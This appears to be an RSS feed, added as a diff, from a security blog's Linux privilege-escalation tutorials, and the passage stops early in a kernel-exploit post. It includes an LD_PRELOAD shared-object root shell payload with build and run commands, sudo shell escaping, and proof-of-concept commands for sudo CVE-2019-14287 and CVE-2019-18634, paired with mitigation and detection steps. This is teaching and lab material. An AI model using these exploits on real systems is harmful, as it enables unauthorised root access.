+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">_init&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">unsetenv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setgid&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setuid&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Save it as &lt;code>shell.c&lt;/code> inside &lt;strong>/tmp&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://3.bp.blogspot.com/-H4g6p2ggbfA/WyKXVJnFfCI/AAAAAAAAXYE/jtgOe57paVYSq5EPS7ddVbVRiOFsP3m8gCEwYBhgL/s1600/5.png"
+loading="lazy"
+alt="Compiling the Shell Program"
+>&lt;/p>
+&lt;p>Next, compile it to generate a shared object with a &lt;code>.so&lt;/code> extension, similar to a &lt;code>.dll&lt;/code> file in the Windows operating system. Enter the following command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Check the generated file:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ls -al shell.so
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Now execute the &lt;code>find&lt;/code> command with &lt;code>LD_PRELOAD&lt;/code> set to the path of the shared object:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo &lt;span class="nv">LD_PRELOAD&lt;/span>&lt;span class="o">=&lt;/span>/tmp/shell.so find
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>To verify the privileges, run:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">id
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://1.bp.blogspot.com/-SmdjE6lvzUI/WyKXVZ-5akI/AAAAAAAAXYM/ic2oN4QGsc4xmfyDUrwUMmWV0uL5bDntgCEwYBhgL/s1600/6.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>And finally, you should have obtained root privileges! 😉&lt;/p>
+&lt;h2 id="resources-">Resources :
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/" target="_blank" rel="noopener"
+>https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.youtube.com/watch?v=bzjnIi5u9OQ" target="_blank" rel="noopener"
+>https://www.youtube.com/watch?v=bzjnIi5u9OQ&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>Shell Escaping</title><link>https://zerodex1.github.io/p/shell-escaping/</link><pubDate>Fri, 24 Jan 2025 12:38:00 +0000</pubDate><guid>https://zerodex1.github.io/p/shell-escaping/</guid><description>&lt;img src="https://zerodex1.github.io/post/sudo-lc.jpg" alt="Featured image of post Shell Escaping" />&lt;h1 id="whats-sudo-shell-escaping">What&amp;rsquo;s Sudo Shell Escaping
+&lt;/h1>&lt;p>&lt;strong>Sudo shell escaping&lt;/strong> refers to a technique where a user with limited privileges uses &lt;code>sudo&lt;/code> to bypass restrictions and execute commands as a higher-privileged user, typically root. This can occur if the &lt;code>sudo&lt;/code> configuration (the &lt;code>sudoers&lt;/code> file) allows running commands that invoke a shell or provide shell-like functionality.&lt;/p>
+&lt;h1 id="getting-privilege-escalation">Getting Privilege Escalation
+&lt;/h1>&lt;p>To gain higher privileges using &lt;code>sudo&lt;/code>, follow these steps:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Check how many commands you can run with &lt;code>sudo&lt;/code> as a low-privilege user:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo -l
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://zerodex1.github.io/post/sudo-l.png"
+loading="lazy"
+alt="image alt text"
+>&lt;/p>
+&lt;pre>&lt;code>As seen in the image, there are some tools and services that can be run as `sudo`. To make exploitation easier, we can visit this site: [GTFOBins](https://gtfobins.github.io/).
+This site provides a lot of useful information. Let's search for one of these services, such as **Vim**.
+&lt;/code>&lt;/pre>
+&lt;p>&lt;img src="https://zerodex1.github.io/post/gtfbon.png"
+loading="lazy"
+alt="image alt text"
+>&lt;/p>
+&lt;pre>&lt;code>Simply copy the following command and paste it into your target terminal, and you will gain root privileges.
+&lt;/code>&lt;/pre>
+&lt;h1 id="conclusion">Conclusion
+&lt;/h1>&lt;p>In conclusion, sudo shell escaping is a powerful technique that can be exploited to gain unauthorized root access on a system. By identifying commands that can be run with elevated privileges, attackers can leverage tools like GTFOBins to execute malicious payloads and bypass security restrictions. Understanding these offensive methods is crucial for penetration testers and security professionals as they simulate attacks and identify vulnerabilities.&lt;/p></description></item><item><title>Sudo CVEs</title><link>https://zerodex1.github.io/p/sudo-cves/</link><pubDate>Thu, 23 Jan 2025 14:14:48 +0000</pubDate><guid>https://zerodex1.github.io/p/sudo-cves/</guid><description>&lt;img src="https://zerodex1.github.io/post/cvesudo.jpg" alt="Featured image of post Sudo CVEs" />&lt;h1 id="sudo-cves">Sudo CVEs
+&lt;/h1>&lt;p>In this article, we will discuss sudo CVEs, specifically &lt;code>CVE-2019-14287&lt;/code> and &lt;code>CVE-2019-18634&lt;/code>, and how they allow us to achieve sudo privilege escalation on Linux systems.&lt;/p>
+&lt;h2 id="cve-2019-14287">&lt;strong>CVE-2019-14287&lt;/strong>
+&lt;/h2>&lt;p>CVE-2019-14287 is a vulnerability in &lt;code>sudo&lt;/code> that allows a user with restricted privileges to execute arbitrary commands as &lt;strong>root&lt;/strong>, even if they are explicitly denied in the &lt;code>sudoers&lt;/code> file. This occurs due to improper validation of the user ID (&lt;code>UID&lt;/code>) when running commands.&lt;/p>
+&lt;hr>
+&lt;h2 id="details-of-the-vulnerability">&lt;strong>Details of the Vulnerability&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Affected Software&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>sudo&lt;/code> versions prior to &lt;strong>1.8.28&lt;/strong>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Vulnerability Description&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>When &lt;code>sudo&lt;/code> is configured to allow a user to execute commands as any user &lt;strong>except root&lt;/strong> using the &lt;code>!ALL&lt;/code> directive in the &lt;code>sudoers&lt;/code> file, the vulnerability allows bypassing this restriction.&lt;/li>
+&lt;li>The issue arises because &lt;code>sudo&lt;/code> does not properly handle the &lt;code>-1&lt;/code> or &lt;code>4294967295&lt;/code> value for the &lt;code>UID&lt;/code>. Internally, these values are interpreted as &lt;code>0&lt;/code> (root).&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Exploitation&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>A user can exploit this by specifying &lt;code>-u#-1&lt;/code> to execute a command as root, bypassing the restrictions.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="proof-of-concept-poc">&lt;strong>Proof of Concept (PoC)&lt;/strong>
+&lt;/h2>&lt;h3 id="1-vulnerable-configuration-in-etcsudoers">1. Vulnerable Configuration in &lt;code>/etc/sudoers&lt;/code>:
+&lt;/h3>&lt;p>The following configuration denies a user (&lt;code>exampleuser&lt;/code>) from executing commands as root:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">exampleuser ALL=(ALL,!root) ALL
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="2-exploit-command">2. Exploit Command:
+&lt;/h3>&lt;p>The attacker can bypass the restriction and run commands as root:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo -u#-1 id
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="3-expected-output">3. Expected Output:
+&lt;/h3>&lt;p>The command will execute as root (&lt;code>UID=0&lt;/code>):&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">uid=0(root) gid=0(root) groups=0(root)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="impact">&lt;strong>Impact&lt;/strong>
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Privilege Escalation&lt;/strong>: The attacker gains root privileges, bypassing intended restrictions.&lt;/li>
+&lt;li>&lt;strong>Severity&lt;/strong>: High (CVSS Score: 7.8).&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="mitigation">&lt;strong>Mitigation&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Update &lt;code>sudo&lt;/code>&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Upgrade to &lt;strong>sudo 1.8.28&lt;/strong> or later, which properly validates &lt;code>UID&lt;/code> values.&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> sudo apt install sudo
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Audit and Restrict sudoers Configuration&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Ensure your &lt;code>sudoers&lt;/code> file does not rely solely on &lt;code>!root&lt;/code> for user restrictions.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Monitor and Log sudo Usage&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Use logs to monitor unusual activity involving &lt;code>sudo&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="labs-">Labs :
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a class="link" href="https://tryhackme.com/r/room/sudovulnsbypass" target="_blank" rel="noopener"
+>https://tryhackme.com/r/room/sudovulnsbypass&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h3 id="tryhackme-lab">TryHackMe Lab
+&lt;/h3>&lt;p>Now that we have access to the machine, our next goal is to gain root privileges using the identified vulnerability.&lt;/p>
+&lt;p>First, we use the command &lt;code>sudo -l&lt;/code> to check what commands we can execute with the current user.&lt;/p>
+&lt;p>&lt;img src="https://zerodex1.github.io/post/cves1.png"
+loading="lazy"
+alt="image alt text"
+>&lt;/p>
+&lt;p>After running &lt;code>sudo -l&lt;/code>, we see that we can run &lt;code>/bin/bash&lt;/code> as another user except for root. Let’s exploit this vulnerability.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo -u#-1 /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://zerodex1.github.io/post/cvs2.png"
+loading="lazy"
+alt="image alt text"
+>&lt;/p>
+&lt;p>And just like that, we are now the root user! :&lt;/p>
+&lt;h3 id="references">&lt;strong>References&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>&lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287" target="_blank" rel="noopener"
+>MITRE CVE Details&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="cve-2019-18634">&lt;strong>CVE-2019-18634&lt;/strong>
+&lt;/h2>&lt;p>CVE-2019-18634 is a &lt;strong>buffer overflow vulnerability&lt;/strong> in &lt;code>sudo&lt;/code> that can allow local privilege escalation. It specifically affects &lt;code>sudo&lt;/code> configurations where &lt;strong>pwfeedback&lt;/strong> is enabled, which can result in memory corruption and potentially lead to unauthorized code execution or system crashes.&lt;/p>
+&lt;hr>
+&lt;h2 id="details-of-the-vulnerability-1">&lt;strong>Details of the Vulnerability&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Affected Software&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>sudo&lt;/code> versions prior to &lt;strong>1.8.31&lt;/strong>.&lt;/li>
+&lt;li>Only configurations with &lt;strong>pwfeedback&lt;/strong> enabled are affected.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Vulnerability Description&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>The &lt;strong>pwfeedback&lt;/strong> option, which provides visual feedback when typing a password (e.g., asterisks), is susceptible to a buffer overflow.&lt;/li>
+&lt;li>If the input exceeds the buffer size, it overflows, corrupting memory.&lt;/li>
+&lt;li>The issue is exploitable only when the attacker provides their own password input, making it a local attack vector.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Exploitation&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>By triggering the buffer overflow, an attacker can potentially execute arbitrary code or crash the &lt;code>sudo&lt;/code> process.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="proof-of-concept-poc-1">&lt;strong>Proof of Concept (PoC)&lt;/strong>
+&lt;/h2>&lt;h3 id="1-vulnerable-configuration">1. Vulnerable Configuration:
+&lt;/h3>&lt;p>The &lt;code>/etc/sudoers&lt;/code> file must have &lt;strong>pwfeedback&lt;/strong> enabled:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Defaults pwfeedback
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="2-exploit-steps">2. Exploit Steps:
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>Use a specially crafted input (e.g., very long password) to overflow the buffer.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>For example:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 -c &lt;span class="s2">&amp;#34;print(&amp;#39;A&amp;#39; * 10000)&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> sudo -S id
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>This may result in a segmentation fault or allow further exploitation.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="3-output">3. Output:
+&lt;/h3>&lt;p>If the system is vulnerable, it could crash with a segmentation fault:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Segmentation fault (core dumped)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="impact-1">&lt;strong>Impact&lt;/strong>
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Privilege Escalation&lt;/strong>: Potential execution of arbitrary code with root privileges.&lt;/li>
+&lt;li>&lt;strong>Denial of Service&lt;/strong>: Crash or instability of the &lt;code>sudo&lt;/code> process.&lt;/li>
+&lt;li>&lt;strong>Severity&lt;/strong>: High (CVSS Score: 7.8).&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="mitigation-1">&lt;strong>Mitigation&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Update &lt;code>sudo&lt;/code>&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Upgrade to &lt;code>sudo&lt;/code> version &lt;strong>1.8.31&lt;/strong> or later, where the issue is patched:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> sudo apt install sudo
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Disable pwfeedback&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Ensure the &lt;code>pwfeedback&lt;/code> option is not enabled in &lt;code>/etc/sudoers&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Defaults !pwfeedback
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Apply Principle of Least Privilege&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Limit sudo access to necessary users and monitor suspicious activity.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="detection">&lt;strong>Detection&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Check sudo Version&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo --version
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Search for pwfeedback in sudoers&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo grep pwfeedback /etc/sudoers /etc/sudoers.d/*
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="labs--1">Labs :
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a class="link" href="https://tryhackme.com/r/room/sudovulnsbof" target="_blank" rel="noopener"
+>https://tryhackme.com/r/room/sudovulnsbof&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="references-1">&lt;strong>References&lt;/strong>
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.sudo.ws/alerts/pwfeedback.html" target="_blank" rel="noopener"
+>Sudo Security Advisory&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18634" target="_blank" rel="noopener"
+>MITRE CVE Details&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>Sudo Attacks</title><link>https://zerodex1.github.io/p/sudo-attacks/</link><pubDate>Thu, 23 Jan 2025 13:48:02 +0000</pubDate><guid>https://zerodex1.github.io/p/sudo-attacks/</guid><description>&lt;img src="https://zerodex1.github.io/post/sudo.jpg" alt="Featured image of post Sudo Attacks" />&lt;h1 id="introduction-to-sudo-attacks-and-privilege-escalation-on-linux">Introduction to Sudo Attacks and Privilege Escalation on Linux
+&lt;/h1>&lt;p>In the world of Linux-based operating systems, the &lt;code>sudo&lt;/code> command plays a critical role in user privilege management. It allows permitted users to execute commands as the superuser (root) or another user, as specified by the security policy. However, various vulnerabilities have been discovered in &lt;code>sudo&lt;/code> that can lead to privilege escalation, allowing unauthorized users to gain elevated access to system resources.&lt;/p>
+&lt;p>This discussion centers around several notable vulnerabilities, including CVE-2019-14287 and CVE-2019-18634, which have garnered attention for their potential to exploit the &lt;code>sudo&lt;/code> command for malicious purposes. These vulnerabilities demonstrate the importance of understanding how &lt;code>sudo&lt;/code> can be misconfigured or manipulated, leading to security breaches.&lt;/p>
+&lt;h2 id="topics-to-discuss">Topics to Discuss
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>CVE-2019-14287&lt;/strong>: CVE-2019-14287 is a vulnerability in &lt;code>sudo&lt;/code> that allows a user with restricted privileges to execute arbitrary commands as &lt;strong>root&lt;/strong>, even if they are explicitly denied in the &lt;code>sudoers&lt;/code> file. This occurs due to improper validation of the user ID (&lt;code>UID&lt;/code>) when running commands.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>CVE-2019-18634&lt;/strong>: CVE-2019-18634 is a &lt;strong>buffer overflow vulnerability&lt;/strong> in &lt;code>sudo&lt;/code> that can allow local privilege escalation. It specifically affects &lt;code>sudo&lt;/code> configurations where &lt;strong>pwfeedback&lt;/strong> is enabled, which can result in memory corruption and potentially lead to unauthorized code execution or system crashes.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Shell Escaping&lt;/strong>: This topic focuses on the concept of shell escaping in command execution, particularly when arguments passed to the shell are not properly sanitized. Attackers can craft malicious input to manipulate shell behavior, leading to unintentional command executions with elevated privileges.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>LD_PRELOAD&lt;/strong>: This is an environment variable that can be exploited to execute malicious shared libraries before any other libraries when running a program. By using &lt;code>LD_PRELOAD&lt;/code>, attackers can intercept and modify calls to system functions within programs invoked with &lt;code>sudo&lt;/code>, paving the way for privilege escalation.&lt;/p>
+&lt;/li>
+&lt;/ol></description></item><item><title>Linux Kernel Exploit Privesc</title><link>https://zerodex1.github.io/p/linux-kernel-exploit-privesc/</link><pubDate>Wed, 22 Jan 2025 12:43:56 +0000</pubDate><guid>https://zerodex1.github.io/p/linux-kernel-exploit-privesc/</guid><description>&lt;img src="https://zerodex1.github.io/post/bestcoverblog.jpg" alt="Featured image of post Linux Kernel Exploit Privesc" />&lt;h1 id="whats-a-kernel-exploit">What&amp;rsquo;s a Kernel Exploit?
+&lt;/h1>&lt;p>A &lt;strong>kernel exploit&lt;/strong> refers to a technique used to exploit vulnerabilities within the kernel, the core component of an operating system. By leveraging these vulnerabilities, attackers can gain unauthorized access or elevate their privileges on the system. The ultimate goal of a kernel exploit is to execute arbitrary code within the kernel&amp;rsquo;s privileged context, often leading to root access and full control over the compromised machine.&lt;/p>
+&lt;h3 id="conditions-for-a-successful-kernel-exploit">Conditions for a Successful Kernel Exploit
+&lt;/h3>&lt;p>For a kernel exploit attack to be successful, an attacker must meet four critical conditions:&lt;/p>
+&lt;ol>
